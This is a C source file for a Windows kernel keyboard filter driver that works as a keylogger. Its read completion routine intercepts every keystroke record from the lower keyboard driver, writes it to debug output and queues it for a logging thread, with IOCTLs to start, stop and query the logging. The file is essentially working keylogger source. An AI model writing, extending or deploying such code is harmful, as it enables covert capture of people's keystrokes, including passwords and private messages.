#include "dispatch.h"
#include "debug.h"
#include "ioctl.h"
#include "log.h"

NTSTATUS passThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	const PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);

	switch (pStackLocation->MajorFunction) {
	case IRP_MJ_CREATE:
		DBG_PRINT("passThrough: Case IRP_MJ_CREATE\n");
		break;
	case IRP_MJ_CLOSE:
		DBG_PRINT("passThrough: Case IRP_MJ_CLOSE\n");
		break;
	case IRP_MJ_CLEANUP:
		DBG_PRINT("passThrough: Case IRP_MJ_CLEANUP\n");
		break;
	default:
		DBG_PRINTF("passThrough: Unknown case 0x%lx\n", pStackLocation->MajorFunction);
		break;
	}

	if (pDeviceObject->DeviceExtension) {
		const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;

		// if current device is attached to a lower level device, its driver needs to be called
		if (pTargetDevice) {
			IoSkipCurrentIrpStackLocation(pIrp);

			DBG_PRINT("passThrough: Calling IoCallDriver\n");

			return IoCallDriver(pTargetDevice, pIrp);
		}
		else {
			DBG_PRINT("passThrough: No target device in device extension\n");
		}

	}

	const NTSTATUS ntStatus = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = ntStatus;
	IofCompleteRequest(pIrp, IO_NO_INCREMENT);

	return ntStatus;
}


BOOLEAN isLogging;

NTSTATUS dispatchDevCtl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	const PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	
	if (pStackLocation->MajorFunction != IRP_MJ_DEVICE_CONTROL) {
		DBG_PRINT("dispatchDevCtl: Invalid major function\n");

		return STATUS_INVALID_PARAMETER;
	}

	#ifdef DBG
	const ULONG ioControlCode = pStackLocation->Parameters.DeviceIoControl.IoControlCode;
	#endif // DBG

	DBG_PRINTF("dispatchDevCtl: Received IO control code: 0x%lx\n", ioControlCode);

	NTSTATUS ntStatus = STATUS_SUCCESS;

	switch (pStackLocation->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_SEND_LOG_STATE:
		*(BOOLEAN*)pIrp->AssociatedIrp.SystemBuffer = isLogging;
		pIrp->IoStatus.Information = sizeof(BOOLEAN);
		DBG_PRINTF("dispatchDevCtl: Sent log state: %hhu\n", isLogging);
		break;
	case IOCTL_LOG_START:
		
		// only start loggin if not logging anymore
		if (!kbdInputQueue.isWaiting && !kbdInputQueue.size) {
			
			isLogging = TRUE;
			initBlockingQueue(&kbdInputQueue, 0x10);
			ntStatus = startLogThread(pDeviceObject->DriverObject);

			if (NT_SUCCESS(ntStatus)) {
				DBG_PRINT("dispatchDevCtl: Started log thread\n");
			}
			else {
				DBG_PRINTF("dispatchDevCtl: startLogThread failed: 0x%lx\n", ntStatus);
			}

		}

		pIrp->IoStatus.Information = 0;
		break;
	case IOCTL_LOG_STOP:
		isLogging = FALSE;
		pIrp->IoStatus.Information = 0;
		DBG_PRINT("dispatchDevCtl: Stopped logging\n");
		break;
	default:
		ntStatus = STATUS_INVALID_PARAMETER;
	}

	pIrp->IoStatus.Status = ntStatus;
	IofCompleteRequest(pIrp, IO_NO_INCREMENT);

	return ntStatus;
}


KSEMAPHORE readSemaphore;

static NTSTATUS completeRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);

NTSTATUS dispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	// start read operation
	// timeout needs to be zero at IRQL >= DISPATCH_LEVEL
	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
	const NTSTATUS ntStatus = KeWaitForSingleObject(&readSemaphore, Executive, KernelMode, FALSE, &zeroTimeout);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("dispatchRead: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}
	// completeRead has not finished yet
	else if (ntStatus == STATUS_TIMEOUT) {
		DBG_PRINT("dispatchRead: KeWaitForSingleObject timeout\n");
		IoSkipCurrentIrpStackLocation(pIrp);
	}
	else {
		IoCopyCurrentIrpStackLocationToNext(pIrp);
		IoSetCompletionRoutine(pIrp, completeRead, NULL, TRUE, TRUE, TRUE);
	}
	
	if (!pDeviceObject->DeviceExtension) {
		DBG_PRINT("dispatchRead: No device extension\n");

		return STATUS_INVALID_PARAMETER;
	}

	const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;

	if (!pTargetDevice) {
		DBG_PRINT("dispatchRead: No target device\n");

		return STATUS_INVALID_PARAMETER;
	}

	// call lower level driver
	return IoCallDriver(pTargetDevice, pIrp);
}


static NTSTATUS completeRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID pContext) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(pContext);

	const PKEYBOARD_INPUT_DATA pKbdInputData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;

	if (pKbdInputData) {
		
		if (isLogging) {
			logKbdToDbg(pKbdInputData);
		}

		// if blocking queue is waiting, it needs at least one more item
		if (kbdInputQueue.isWaiting) {

			// if logging is switched off, the blocking queue does not need to wait anymore
			if (!isLogging) {
				kbdInputQueue.isWaiting = FALSE;
			}

			KbdListData* pKbdListData = (KbdListData*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KbdListData), 'KBLI');

			if (pKbdListData) {
				pKbdListData->data = *pKbdInputData;
				const NTSTATUS ntStatus = addToBlockigQueue(&kbdInputQueue, &pKbdListData->list);

				if (ntStatus != STATUS_SUCCESS) {
					DBG_PRINTF("completeRead: addBlockigQueue failed: 0x%lx\n", ntStatus);

					ExFreePoolWithTag(pKbdListData, 'KBLI');
				}

			}
			else {
				DBG_PRINT("completeRead: ExAllocatePool2 failed\n");
			}

		}

	}
	else {
		DBG_PRINT("completeRead: No data\n");
	}

	NTSTATUS ntStatus = pIrp->IoStatus.Status;

	if (pIrp->PendingReturned) {
		IoMarkIrpPending(pIrp);
		ntStatus = STATUS_PENDING;
	}

	// finish read operation
	KeReleaseSemaphore(&readSemaphore, 0, 1, FALSE);

	return ntStatus;
}